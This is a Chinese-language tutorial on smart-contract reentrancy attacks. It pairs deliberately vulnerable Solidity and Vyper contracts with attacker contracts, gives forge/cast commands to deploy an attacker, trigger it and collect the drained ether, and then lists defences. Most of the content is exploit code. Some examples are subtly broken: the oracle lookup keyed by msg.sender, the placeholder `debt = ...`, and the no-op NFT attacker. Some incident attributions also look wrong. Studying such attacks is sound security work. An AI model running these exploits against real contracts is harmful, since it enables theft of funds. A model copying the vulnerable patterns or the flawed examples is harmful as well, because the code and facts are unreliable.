# 重入攻击 (Reentrancy)

## 原理

合约在调用外部合约时，外部合约通过回调函数重新进入原合约，利用状态未更新的窗口重复执行提款等操作。

## 经典漏洞

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vulnerable {
    mapping(address => uint) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");
        
        // 漏洞：先转账再更新余额
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;  // 状态更新在转账之后
    }
}
```

## 攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerable public target;
    
    constructor(address _target) public {
        target = IVulnerable(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    
    // 接收以太坊时触发重入
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
    
    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

## 攻击链

### 1. 部署攻击合约

```bash
# 使用 Foundry
forge create Attacker --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $TARGET_ADDRESS
```

### 2. 发起攻击

```bash
cast send $ATTACKER_ADDRESS "attack()" --value 1ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### 3. 收集资金

```bash
cast send $ATTACKER_ADDRESS "collect()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

## 防护方法

### 1. Checks-Effects-Interactions 模式

```solidity
function withdraw() external {
    // 1. Checks
    uint amount = balances[msg.sender];
    require(amount > 0, "Insufficient balance");
    
    // 2. Effects
    balances[msg.sender] = 0;
    
    // 3. Interactions
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

### 2. ReentrancyGuard

```solidity
// OpenZeppelin ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Safe is ReentrancyGuard {
    function withdraw() external nonReentrant {
        // ...
    }
}
```

### 3. 使用 transfer/transfer

```solidity
// transfer 限制 2300 gas，无法重入
msg.sender.transfer(amount);

// 但不推荐，因为 gas 限制可能不够
```

## 重入变种

### 1. 跨函数重入

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CrossFunctionVulnerable {
    mapping(address => uint256) public balances;
    mapping(address => bool) public isInitialized;
    
    uint256 public rewardMultiplier = 2;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // 初始化奖励：给用户 2 倍存款的奖励
    function initializeReward() external {
        require(!isInitialized[msg.sender], "Already initialized");
        isInitialized[msg.sender] = true;
        uint256 reward = balances[msg.sender] * rewardMultiplier;
        (bool success, ) = msg.sender.call{value: reward}("");
        require(success);
    }
    
    // 提款函数：先转账，后更新状态
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0);
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }
}
```

```solidity
// 攻击合约
contract CrossFunctionAttacker {
    CrossFunctionVulnerable public target;
    uint256 public attackCount;
    
    constructor(address _target) {
        target = CrossFunctionVulnerable(_target);
    }
    
    function attack() external payable {
        attackCount = 0;
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    
    receive() external payable {
        attackCount++;
        if (attackCount == 1) {
            // 第一次回调：在 withdraw 的转账后、状态更新前
            // 此时 balances 还未清零，但 ETH 已经转出
            // 先初始化奖励，利用当前 balances 获取奖励
            target.initializeReward();
            // 再次提款：由于 balances 尚未清零，可以再次提取
            target.withdraw();
        }
    }
    
    function collect() external payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

**攻击原理**：withdraw 中先 call 转账，后清零余额。攻击者在 receive 回调中调用 initializeReward()，
此时 balances 尚未清零，因此能获得额外奖励；再调用 withdraw() 时，balances 仍未被清零，可重复提款。
两个不同函数共享同一个状态变量，形成跨函数重入。

### 2. 跨合约重入

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 合约 A：流动性池
contract LiquidityPool {
    mapping(address => uint256) public deposits;
    IPriceOracle public oracle;
    
    constructor(address _oracle) {
        oracle = IPriceOracle(_oracle);
    }
    
    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount);
        deposits[msg.sender] -= amount;
        
        // 通过 oracle 获取价格进行结算
        uint256 value = amount * oracle.getPrice();
        
        // 先转账
        (bool success, ) = msg.sender.call{value: value}("");
        require(success);
    }
}

// 合约 B：价格预言机（可被操控）
contract PriceOracle {
    mapping(address => uint256) public prices;
    
    function getPrice() external view returns (uint256) {
        // 价格来自另一个受重入影响的状态
        return prices[msg.sender];
    }
    
    function setPrice(uint256 price) external {
        prices[msg.sender] = price;
    }
}

// 攻击合约
contract CrossContractAttacker {
    LiquidityPool public pool;
    PriceOracle public oracle;
    uint256 public step;
    
    constructor(address _pool, address _oracle) {
        pool = LiquidityPool(_pool);
        oracle = PriceOracle(_oracle);
    }
    
    function attack() external payable {
        step = 0;
        pool.deposit{value: msg.value}();
        pool.withdraw(msg.value);
    }
    
    receive() external payable {
        step++;
        if (step == 1) {
            // 第一次回调：操纵 B 合约中的价格状态
            oracle.setPrice(type(uint256).max / 1 ether);
            // 再次提款，利用被操纵的价格
            pool.withdraw(1);
        }
    }
}
```

**攻击原理**：合约 A 在提款时回调攻击者，攻击者趁机调用合约 B 操纵价格预言机状态，
使合约 A 基于被操纵的价格进行超额结算，实现跨合约重入攻击。

### 3. 只读重入（Read-Only Reentrancy）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 有漏洞的质押合约
contract StakingVault {
    mapping(address => uint256) public staked;
    uint256 public totalStaked;
    uint256 public rewardPerToken;  // 累积奖励 / 总质押量
    
    function deposit() external payable {
        if (totalStaked > 0) {
            // 累积奖励（基于转账前的 totalStaked）
            rewardPerToken += (msg.value * 1e18) / totalStaked;
        }
        staked[msg.sender] += msg.value;
        totalStaked += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        // 先更新奖励（基于转账前的 totalStaked）
        uint256 reward = (staked[msg.sender] * rewardPerToken) / 1e18;
        staked[msg.sender] -= amount;
        totalStaked -= amount;
        
        // 转账
        (bool success, ) = msg.sender.call{value: amount + reward}("");
        require(success);
    }
    
    // view 函数：返回用户奖励（可被重入读取到错误值）
    function pendingReward(address user) external view returns (uint256) {
        return (staked[user] * rewardPerToken) / 1e18;
    }
}

// 依赖上述 view 函数的流动性池（被攻击者）
contract LiquidityGauge {
    mapping(address => uint256) public balances;
    StakingVault public vault;
    uint256 public totalShares;
    
    constructor(address _vault) {
        vault = StakingVault(_vault);
    }
    
    function deposit() external {
        // 读取 vault 的 pendingReward 来计算份额
        uint256 reward = vault.pendingReward(msg.sender);
        // 此时 vault 正在执行 withdraw 的转账回调
        // totalStaked 已减少，但 staked[user] 尚未更新
        // 导致 reward 计算出错误的高值
        uint256 shares = reward;  // 用错误的高 reward 计算
        balances[msg.sender] += shares;
        totalShares += shares;
    }
}

// 攻击合约
contract ReadOnlyReentrancyAttacker {
    StakingVault public vault;
    LiquidityGauge public gauge;
    uint256 public step;
    
    constructor(address _vault, address _gauge) {
        vault = StakingVault(_vault);
        gauge = LiquidityGauge(_gauge);
    }
    
    function attack() external payable {
        step = 0;
        vault.deposit{value: msg.value}();
        vault.withdraw(1);
    }
    
    receive() external payable {
        step++;
        if (step == 1) {
            // vault 正在 withdraw 中间：totalStaked 已减少但 staked 尚未减少
            // gauge 读取 pendingReward 时得到错误的高值
            gauge.deposit();
        }
        // 转发剩余 ETH
        if (address(this).balance > 0) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
}
```

**攻击原理**：只读重入不需要直接窃取目标合约资金。攻击者在质押合约 withdraw 的转账回调中，
调用另一个合约的函数。该合约通过 view 函数读取质押合约状态，但此时状态处于中间态（部分已更新、部分未更新），
导致计算出错误的奖励/份额，从而获得不公平的优势。

> **真实案例**：2023 年 Euler Finance、Convex/Convexity 等多个 DeFi 协议受只读重入影响，
> 攻击者通过操纵 view 函数的返回值获利。

### 4. ERC-777 重入（tokensReceived 钩子）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ERC-777 代币接口（简化）
interface IERC777 {
    function transfer(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

// ERC-777 接收者接口
interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

// 有漏洞的 DeFi 协议
contract VulnerableVault {
    mapping(address => uint256) public deposits;
    IERC777 public token;
    
    constructor(address _token) {
        token = IERC777(_token);
    }
    
    function deposit(uint256 amount) external {
        deposits[msg.sender] += amount;
        // 先更新状态，再转账（看似安全，但 ERC-777 有钩子）
        // 如果 token 是 ERC-777，transfer 内部会调用接收者的 tokensReceived
        token.transfer(msg.sender, amount);  // 外部调用
    }
    
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount);
        deposits[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }
    
    // 计算奖励：基于当前存款
    function claimReward() external {
        uint256 reward = deposits[msg.sender] / 10;
        token.transfer(msg.sender, reward);
    }
}

// 攻击合约（实现 IERC777Recipient）
contract ERC777ReentrantAttacker is IERC777Recipient {
    VulnerableVault public vault;
    IERC777 public token;
    uint256 public attackAmount;
    uint256 public step;
    
    constructor(address _vault, address _token) {
        vault = VulnerableVault(_vault);
        token = IERC777(_token);
    }
    
    function attack(uint256 _amount) external {
        attackAmount = _amount;
        step = 0;
        vault.deposit(_amount);
    }
    
    // ERC-777 钩子：transfer 时自动回调
    function tokensReceived(
        address,  // operator
        address,  // from
        address,  // to
        uint256,  // amount
        bytes calldata,  // userData
        bytes calldata   // operatorData
    ) external override {
        step++;
        if (step == 1) {
            // 第一次 tokensReceived 回调：
            // vault.deposit 已更新 deposits，token.transfer 中触发回调
            // 此时可以调用 claimReward 获得额外奖励
            vault.claimReward();
        }
    }
}
```

**攻击原理**：ERC-777 的 `transfer` 在转账过程中会自动调用接收者的 `tokensReceived` 钩子函数。
即使合约遵循了 Checks-Effects-Interactions 模式，ERC-777 的钩子仍然会在 `transfer` 内部触发回调，
导致在状态更新完成后、转账尚未完全完成时再次进入合约逻辑。
攻击者通过实现 `IERC777Recipient` 接口，在 `tokensReceived` 中执行额外操作。

### 5. ERC-721/ERC-1155 重入

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

// 有漏洞的 NFT 质押合约
contract NFTVault {
    mapping(address => uint256[]) public stakedNFTs;
    mapping(uint256 => address) public nftOwner;  // tokenId => 质押者
    uint256 public rewardPerNFT;
    mapping(address => uint256) public pendingRewards;
    
    function stakeNFT(address nftContract, uint256 tokenId) external {
        // 转入 NFT：safeTransferFrom 会触发 onERC721Received
        IERC721(nftContract).safeTransferFrom(msg.sender, address(this), tokenId);
        // 状态更新
        stakedNFTs[msg.sender].push(tokenId);
        nftOwner[tokenId] = msg.sender;
        pendingRewards[msg.sender] += rewardPerNFT;
    }
    
    function unstakeNFT(address nftContract, uint256 tokenId) external {
        require(nftOwner[tokenId] == msg.sender);
        // 先更新状态
        delete nftOwner[tokenId];
        pendingRewards[msg.sender] += rewardPerNFT;
        
        // 转出 NFT：safeTransferFrom 触发接收者回调
        IERC721(nftContract).safeTransferFrom(address(this), msg.sender, tokenId);
        
        // ⚠️ 注意：stakedNFTs 数组未及时清理
        // 如果在回调中再次 stakeNFT，可以重复计算 pendingRewards
    }
}

// 攻击合约
contract NFTReentrancyAttacker {
    NFTVault public vault;
    address public nftContract;
    
    constructor(address _vault, address _nftContract) {
        vault = NFTVault(_vault);
        nftContract = _nftContract;
    }
    
    // 实现 onERC721Received，当 safeTransferFrom 发送给本合约时自动调用
    function onERC721Received(
        address, address, uint256, bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
    
    function attack(uint256 tokenId) external {
        vault.unstakeNFT(nftContract, tokenId);
    }
}
```

> **ERC-1155 同理**：`safeTransferFrom` 会触发 `onERC1155Received` / `onERC1155BatchReceived`，
> 可用于同样的重入攻击模式。

## 2024-2026 高级重入场景

### 1. Vyper 重入锁漏洞（Curve 攻击）

```python
# Vyper < 0.2.16 的 @nonreentrant 装饰器存在 bug
# 仅检查单个 reentrancy lock，多合约场景下可被绕过

# vulnerable_pool.vy
# @version 0.2.15

balances: HashMap[address, uint256]
locked: bool

@nonreentrant("lock")
def withdraw(amount: uint256):
    assert self.balances[msg.sender] >= amount
    self.balances[msg.sender] -= amount  # 状态更新
    send(msg.sender, amount)              # 外部转账 → 重入点

@nonreentrant("lock")
def deposit():
    self.balances[msg.sender] += msg.value

# 攻击者在 A 池的 withdraw 回调中调用 B 池的 deposit
# 两个 Vyper 池使用不同的 lock 变量
# 如果使用相同的 lock key，@nonreentrant 应该可以防御
# 但 Vyper 0.2.15 的 bug 导致同 key 重入锁在某些情况下失效
```

> **真实案例**：2023 年 7 月 Curve Finance 多个 Vyper 池被攻击，损失约 7000 万美元。

### 2. 闪电贷 + 只读重入操纵价格

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 模拟 Aave V3 闪电贷
interface IFlashLoanProvider {
    function flashLoan(
        address receiver,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external returns (bool);
}

// 被攻击的借贷协议
contract LendingProtocol {
    mapping(address => uint256) public reserves;
    IPriceOracle public oracle;
    
    function getHealthFactor(address user) external view returns (uint256) {
        uint256 collateral = reserves[user] * oracle.getAssetPrice();
        uint256 debt = ...; // 简化
        return collateral / debt;
    }
    
    function liquidate(address user) external {
        require(this.getHealthFactor(user) < 1e18, "Healthy");
        // 清算逻辑...
    }
}

// 攻击合约
contract FlashLoanReadonlyReentrancy {
    address public lendingProtocol;
    
    receive() external payable {
        // 闪电贷回调中：
        // 1. 在协议 A 的提款操作中，其 view 函数被协议 B 重入读取
        // 2. 读取到中间态的价格/余额数据
        // 3. 基于错误数据发起清算
    }
    
    // 1. 借闪电贷
    // 2. 存入协议 A
    // 3. 从协议 A 提款（触发回调）
    // 4. 回调中利用协议 B 读取到的错误 view 值
    // 5. 在协议 B 中执行有利操作（清算、套利等）
    // 6. 还闪电贷 + 利润
}
```

### 3. MEV + 重入组合攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// MEV 机器人利用重入捕获价值
contract MEVReentrantBot {
    // 1. 监控 mempool 中的重入攻击交易
    // 2. 通过 frontrun 插入自己的交易
    // 3. 或在攻击者回调中插入交易获利
    
    // 典型场景：
    // 攻击者调用 vulnerable.withdraw()
    // → vulnerable.send ETH 给攻击者
    // → MEV 机器人的 search 逻辑检测到这是一笔重入
    // → 通过三明治攻击夹击攻击交易
    // → 在价格被操纵前后各插入一笔交易获利
    
    // 新型 MEV 重入：攻击者本身就是 MEV bot
    // 利用 bundle 构造重入攻击 + 套利组合
    // flashbots bundle 保证原子性执行
}
```

> **防护要点**：MEV 重入通常结合 Flashbots bundle，使攻击交易原子化执行，
> 传统的 mempool 监控难以防御。需要在合约层面使用 ReentrancyGuard。

### 4. ERC-4337 账户抽象重入

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ERC-4337 UserOperation 中的 validateUserOp 回调
// 可被用于重入攻击

interface IAccount {
    function validateUserOp(
        UserOperation calldata userOp,
        bytes32 userOpHash,
        uint256 missingAccountFunds
    ) external returns (uint256 validationData);
}

// 有漏洞的 Account Abstraction 合约
contract VulnerableAccount is IAccount {
    mapping(address => uint256) public nonces;
    address public entryPoint;
    
    function validateUserOp(
        UserOperation calldata userOp,
        bytes32,
        uint256
    ) external override returns (uint256) {
        require(msg.sender == entryPoint);
        
        // 验证签名（省略）
        
        // execute_after：EntryPoint 会在 validateUserOp 之后执行 userOp.callData
        // 如果在 validateUserOp 中更新了状态，但在 execute 之前有重入点...
        
        nonces[msg.sender]++;  // 状态更新
        return 0;
    }
    
    function execute(address target, uint256 value, bytes calldata data) external {
        require(msg.sender == address(this));  // 只能自己调用
        (bool success, ) = target.call{value: value}(data);
        require(success);
    }
}

// 如果 EntryPoint 的 handleOps 在 execute 之后回调了其他合约
// 而该合约在 validateUserOp 阶段读取了 nonce
// 则可能产生重入问题
```

### 5. 跨链桥重入

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 跨链桥在处理跨链消息时的重入风险
// 典型模式：桥合约在验证消息后、更新状态前调用外部合约

contract CrossChainBridge {
    mapping(bytes32 => bool) public processedMessages;
    mapping(address => uint256) public deposits;
    
    // 处理从 L2 到 L1 的提款消息
    function processWithdrawal(
        bytes32 messageId,
        address recipient,
        uint256 amount,
        bytes calldata signature
    ) external {
        require(!processedMessages[messageId], "Already processed");
        
        // 1. 验证签名
        require(_verifySignature(messageId, recipient, amount, signature));
        
        // 2. 更新状态
        processedMessages[messageId] = true;
        
        // 3. 转账（回调风险点）
        (bool success, ) = recipient.call{value: amount}("");
        require(success);
        
        // 如果攻击者在步骤 3 的回调中构造另一笔跨链消息
        // 并且验证逻辑在某些情况下可以被绕过
        // 就能重复提款
    }
}
```

### 6. Vyper 编译器 reentrancy 保护的正确用法

```python
# Vyper >= 0.3.7 正确的重入保护
# @version 0.3.7

balances: HashMap[address, uint256]
locked: bool

# @nonreentrant("lock") 锁定期间不能进入任何带有相同 key 的函数
@external
@nonreentrant("lock")
def withdraw(amount: uint256):
    assert self.balances[msg.sender] >= amount
    self.balances[msg.sender] -= amount
    send(msg.sender, amount)

@external
@nonreentrant("lock")
def deposit():
    self.balances[msg.sender] += msg.value

# 多锁模式（不同 key 可以并行）
# "deposit_lock" 和 "withdraw_lock" 是不同的 key
# 同一 key 的函数互斥，不同 key 的函数可以并行执行
@external
@nonreentrant("deposit_lock")
def complex_deposit():
    assert msg.value > 0, "必须发送 ETH"
    self.balances[msg.sender] += msg.value
    log Deposit(msg.sender, msg.value)

@external
@nonreentrant("withdraw_lock")
def complex_withdraw(amount: uint256):
    assert self.balances[msg.sender] >= amount, "余额不足"
    self.balances[msg.sender] -= amount
    send(msg.sender, amount)
    log Withdraw(msg.sender, amount)
```

## 工具推荐

- **Foundry** — 合约开发/测试
- **Slither** — 静态分析
- **Mythril** — 符号执行
- **Echidna** — 模糊测试
- **OpenZeppelin** — 安全库

## 参考链接

- [Smart Contract Attacks](https://github.com/OpenZeppelin/openzeppelin-contracts)
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [The DAO Hack](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)
- [Reentrancy Attack](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
